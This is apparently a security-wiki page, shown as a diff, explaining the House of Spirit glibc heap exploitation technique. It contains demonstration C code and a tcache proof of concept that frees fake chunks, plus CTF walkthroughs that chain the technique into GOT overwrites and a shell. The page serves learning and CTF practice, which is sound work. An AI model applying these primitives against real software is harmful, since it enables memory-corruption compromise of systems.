@@ -1,0 +1,140 @@
+# House of Spirit
+
+## Basic Information
+
+### Code
+
+<details>
+
+<summary>House of Spirit</summary>
+
+```c
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+
+// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit
+
+struct fast_chunk {
+  size_t prev_size;
+  size_t size;
+  struct fast_chunk *fd;
+  struct fast_chunk *bk;
+  char buf[0x20];               // chunk falls in fastbin size range
+};
+
+int main() {
+  struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
+  void *ptr, *victim;
+
+  ptr = malloc(0x30);
+
+  printf("Original alloc address: %p\n", ptr);
+  printf("Main fake chunk:%p\n", &fake_chunks[0]);
+  printf("Second fake chunk for size: %p\n", &fake_chunks[1]);
+
+  // Passes size check of "free(): invalid size"
+  fake_chunks[0].size = sizeof(struct fast_chunk);
+
+  // Passes "free(): invalid next size (fast)"
+  fake_chunks[1].size = sizeof(struct fast_chunk);
+
+  // Attacker overwrites a pointer that is about to be 'freed'
+  // Point to .fd as it's the start of the content of the chunk
+  ptr = (void *)&fake_chunks[0].fd;
+
+  free(ptr);
+
+  victim = malloc(0x30);
+  printf("Victim: %p\n", victim);
+
+  return 0;
+}
+```
+
+</details>
+
+### Goal
+
+- Be able to add into the tcache / fast bin an address so later it's possible to allocate it
+
+### Requirements
+
+- This attack requires an attacker to be able to create a couple of fake fast chunks indicating correctly the size value of it and then to be able to free the first fake chunk so it gets into the bin.
+- With **tcache (glibc ≥2.26)** the attack is even simpler: only one fake chunk is needed (no next-chunk size check is performed on the tcache path) as long as the fake chunk is 0x10-aligned and its size field falls in a valid tcache bin (0x20-0x410 on x64).
+
+### Attack
+
+- Create fake chunks that bypasses security checks: you will need 2 fake chunks basically indicating in the correct positions the correct sizes
+- Somehow manage to free the first fake chunk so it gets into the fast or tcache bin and then it's allocate it to overwrite that address
+
+**The code from** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **is great to understand the attack.** Although this schema from the code summarises it pretty good:
+
+<details>
+<summary>Fake chunk layout</summary>
+
+```c
+/*
+    this will be the structure of our two fake chunks:
+    assuming that you compiled it for x64
+
+    +-------+---------------------+------+
+    | 0x00: | Chunk # 0 prev size | 0x00 |
+    +-------+---------------------+------+
+    | 0x08: | Chunk # 0 size      | 0x60 |
+    +-------+---------------------+------+
+    | 0x10: | Chunk # 0 content   | 0x00 |
+    +-------+---------------------+------+
+    | 0x60: | Chunk # 1 prev size | 0x00 |
+    +-------+---------------------+------+
+    | 0x68: | Chunk # 1 size      | 0x40 |
+    +-------+---------------------+------+
+    | 0x70: | Chunk # 1 content   | 0x00 |
+    +-------+---------------------+------+
+
+    for what we are doing the prev size values don't matter too much
+    the important thing is the size values of the heap headers for our fake chunks
+*/
+```
+
+</details>
+
+> [!TIP]
+> Note that it's necessary to create the second chunk in order to bypass some sanity checks.
+
+### Tcache house of spirit (glibc ≥2.26)
+
+- On modern glibc the **tcache fast-path** calls `tcache_put` before validating the next chunk size/`prev_inuse`, so only the current fake chunk has to look sane.
+- Requirements:
+  - Fake chunk must be **16-byte aligned** and not marked `IS_MMAPPED`/`NON_MAIN_ARENA`.
+  - `size` must belong to a tcache bin and include the **prev_inuse bit set** (`size | 1`).
+  - Tcache for that bin must not be full (default max 7 entries).
+- Minimal PoC (stack chunk):
+```c
+unsigned long long fake[6] __attribute__((aligned(0x10)));
+// chunk header at fake[0]; usable data starts at fake+2
+fake[1] = 0x41;              // fake size (0x40 bin, prev_inuse=1)
+void *p = &fake[2];          // points inside fake chunk
+free(p);                     // goes straight into tcache
+void *q = malloc(0x30);      // returns stack address fake+2
+```
+- **Safe-linking** is not a barrier here: the forward pointer stored in tcache is automatically encoded as `fd = ptr ^ (heap_base >> 12)` during `free`, so the attacker does not need to know the key when using a single fake chunk.
+- This variant is handy when glibc hooks were removed (≥2.34) and you want a fast arbitrary write or to overlap a target buffer (e.g., stack/BSS) with a tcache chunk without creating additional corruptions.
+
+## Examples
+
+- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)
+
+  - **Libc infoleak**: Via an overflow it's possible to change a pointer to point to a GOT address in order to leak a libc address via the read action of the CTF
+  - **House of Spirit**: Abusing a counter that counts the number of "rifles" it's possible to generate a fake size of the first fake chunk, then abusing a "message" it's possible to fake the second size of a chunk and finally abusing an overflow it's possible to change a pointer that is going to be freed so our first fake chunk is freed. Then, we can allocate it and inside of it there is going to be the address to where "message" is stored. Then, it's possible to make this point to the `scanf` entry inside the GOT table, so we can overwrite it with the address to system.\
+    Next time `scanf` is called, we can send the input `"/bin/sh"` and get a shell.
+
+- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
+  - **Glibc leak**: Uninitialized stack buffer.
+  - **House of Spirit**: We can modify the first index of a global array of heap pointers. With a single byte modification, we use `free` on a fake chunk inside a valid chunk, so that we get an overlapping chunks situation after allocating again. With that, a simple Tcache poisoning attack works to get an arbitrary write primitive.
+
+## References
+
+- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)
+- [https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.34/tcache_house_of_spirit.c)
